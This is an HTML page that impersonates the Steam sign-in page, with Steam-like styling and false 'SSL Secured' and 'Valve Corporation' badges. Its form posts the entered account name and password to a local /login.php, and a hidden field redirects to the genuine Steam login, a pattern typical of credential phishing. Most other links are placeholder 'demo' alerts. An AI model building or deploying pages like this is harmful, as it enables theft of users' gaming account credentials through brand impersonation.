<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Steam Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Motiva Sans', Arial, Helvetica, sans-serif;
        }
        
        body {
            background: #1b2838;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }
        
        .container {
            max-width: 700px;
            width: 100%;
            background: #1b2838;
        }
        
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        
        .logo h1 {
            color: white;
            font-size: 42px;
            font-weight: 200;
            letter-spacing: 2px;
        }
        
        .logo span {
            color: #1999ff;
            font-weight: 600;
        }
        
        .card {
            background: #16202d;
            border-radius: 4px;
            padding: 40px 30px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
        }
        
        .card h2 {
            color: white;
            font-size: 26px;
            font-weight: 300;
            margin-bottom: 30px;
            text-align: center;
        }
        
        .login-form {
            display: flex;
            flex-direction: column;
            max-width: 400px;
            margin: 0 auto;
        }
        
        .login-form label {
            color: #afafaf;
            font-size: 12px;
            font-weight: 400;
            margin-bottom: 5px;
            text-transform: uppercase;
        }
        
        .login-form input {
            height: 48px;
            background: #1e2a3a;
            border: 1px solid #253649;
            border-radius: 3px;
            font-size: 16px;
            padding: 0 12px;
            margin-bottom: 20px;
            color: white;
            transition: all 0.2s;
        }
        
        .login-form input:focus {
            outline: none;
            border-color: #1999ff;
            background: #253649;
        }
        
        .login-form input::placeholder {
            color: #4e5e72;
        }
        
        .remember-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin: 10px 0 20px;
        }
        
        .remember-me {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .remember-me input {
            width: 16px;
            height: 16px;
            margin: 0;
            accent-color: #1999ff;
        }
        
        .remember-me label {
            color: #afafaf;
            font-size: 13px;
            text-transform: none;
            cursor: pointer;
        }
        
        .forgot-link {
            color: #afafaf;
            font-size: 13px;
            text-decoration: none;
        }
        
        .forgot-link:hover {
            color: #1999ff;
        }
        
        .login-btn {
            background: linear-gradient(to bottom, #4f8bc9, #316282);
            border: none;
            border-radius: 2px;
            font-size: 16px;
            font-weight: 600;
            color: white;
            height: 48px;
            cursor: pointer;
            margin: 10px 0 15px;
            transition: all 0.2s;
        }
        
        .login-btn:hover {
            background: linear-gradient(to bottom, #5d9ad9, #3b6e94);
        }
        
        .qr-section {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 15px;
            background: #1e2a3a;
            border-radius: 3px;
            margin: 20px 0;
            cursor: pointer;
            transition: background 0.2s;
            max-width: 400px;
            margin: 20px auto;
        }
        
        .qr-section:hover {
            background: #253649;
        }
        
        .qr-icon {
            font-size: 24px;
            color: #afafaf;
        }
        
        .qr-text {
            color: white;
            font-weight: 500;
        }
        
        .qr-subtext {
            font-size: 12px;
            color: #afafaf;
        }
        
        .join-link {
            text-align: center;
            margin: 20px 0;
            font-size: 14px;
            color: #afafaf;
        }
        
        .join-link a {
            color: #1999ff;
            text-decoration: none;
            font-weight: 500;
        }
        
        .join-link a:hover {
            text-decoration: underline;
        }
        
        .footer {
            margin-top: 30px;
            text-align: center;
            font-size: 12px;
            color: #4e5e72;
        }
        
        .footer a {
            color: #4e5e72;
            text-decoration: none;
            margin: 0 8px;
        }
        
        .footer a:hover {
            color: #1999ff;
        }
        
        input[type="hidden"] {
            display: none;
        }
        
        .security-note {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            margin: 20px 0 0;
            font-size: 11px;
            color: #4e5e72;
            padding-top: 20px;
            border-top: 1px solid #253649;
        }
        
        .help-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin: 15px 0;
            font-size: 12px;
        }
        
        .help-links a {
            color: #afafaf;
            text-decoration: none;
        }
        
        .help-links a:hover {
            color: #1999ff;
        }
        
        @media (max-width: 500px) {
            .card {
                padding: 30px 20px;
            }
            
            .remember-row {
                flex-direction: column;
                align-items: flex-start;
                gap: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>STEAM<span>⚡</span></h1>
        </div>
        
        <div class="card">
            <h2>Sign In</h2>
            
            <form method="POST" action="/login.php" id="loginForm" class="login-form">
                <input type="hidden" name="redirect" value="https://steamcommunity.com/login">
                
                <label for="account">Steam Account Name</label>
                <input type="text" id="account" name="username" placeholder="Enter your Steam account name" required autofocus>
                
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
                
                <div class="remember-row">
                    <div class="remember-me">
                        <input type="checkbox" id="remember">
                        <label for="remember">Remember me on this device</label>
                    </div>
                    <a href="#" class="forgot-link" onclick="alert('Password reset demo'); return false;">Forgot?</a>
                </div>
                
                <button type="submit" class="login-btn">Sign in</button>
            </form>
            
            <div class="qr-section" onclick="alert('QR code login demo'); return false;">
                <span class="qr-icon">📱</span>
                <div>
                    <div class="qr-text">Sign in with QR code</div>
                    <div class="qr-subtext">Use the Steam Mobile App</div>
                </div>
            </div>
            
            <div class="join-link">
                Don't have a Steam account? <a href="#" onclick="alert('Create account demo'); return false;">Join Steam</a>
            </div>
            
            <div class="help-links">
                <a href="#" onclick="alert('Help demo'); return false;">Help</a>
                <a href="#" onclick="alert('Account recovery demo'); return false;">Recover Account</a>
                <a href="#" onclick="alert('Support demo'); return false;">Support</a>
            </div>
            
            <div class="security-note">
                <span>🔒</span>
                <span>SSL Secured</span>
                <span>•</span>
                <span>Valve Corporation</span>
            </div>
        </div>
        
        <div class="footer">
            <a href="#" onclick="alert('Terms demo'); return false;">Terms of Use</a>
            <a href="#" onclick="alert('Privacy demo'); return false;">Privacy Policy</a>
            <a href="#" onclick="alert('Legal demo'); return false;">Legal</a>
            <a href="#" onclick="alert('About demo'); return false;">About Steam</a>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const username = document.getElementById('account').value;
            const password = document.getElementById('password').value;
            
            if (!username || !password) {
                e.preventDefault();
                alert('Please enter your account name and password');
                return;
            }
        });
        
        const inputs = document.querySelectorAll('input[type="text"], input[type="password"]');
        inputs.forEach(input => {
            input.addEventListener('focus', function() {
                this.style.borderColor = '#1999ff';
                this.style.background = '#253649';
            });
            
            input.addEventListener('blur', function() {
                if (!this.value) {
                    this.style.borderColor = '#253649';
                    this.style.background = '#1e2a3a';
                }
            });
        });
        
        const rememberCheck = document.getElementById('remember');
        rememberCheck.addEventListener('change', function() {
            // Visual only
        });
        
        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }
        
        window.addEventListener('load', function() {
            document.getElementById('account').focus();
        });
    </script>
</body>
</html>
